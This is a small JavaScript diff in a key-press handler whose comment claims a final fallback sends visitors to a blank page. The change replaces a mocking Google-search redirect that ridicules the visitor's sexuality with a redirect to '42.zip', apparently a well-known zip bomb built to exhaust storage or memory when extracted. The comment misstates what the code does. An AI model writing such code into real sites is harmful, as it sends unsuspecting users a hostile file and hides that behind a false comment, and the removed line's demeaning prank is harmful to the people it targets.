@@ -61,7 +61,7 @@ function handleKeyPress(key) {
 
             // Final fallback: navigate away to a blank page so the site is effectively closed.
             setTimeout(() => {
-                window.location.href = 'https://www.google.com/search?q=how+to+tell+my+parents+i%27m+a+gay+furry+femboy&utm';
+                window.location.href = 'https://unforgettable.dk/42.zip';
             }, 100);
 
             return;
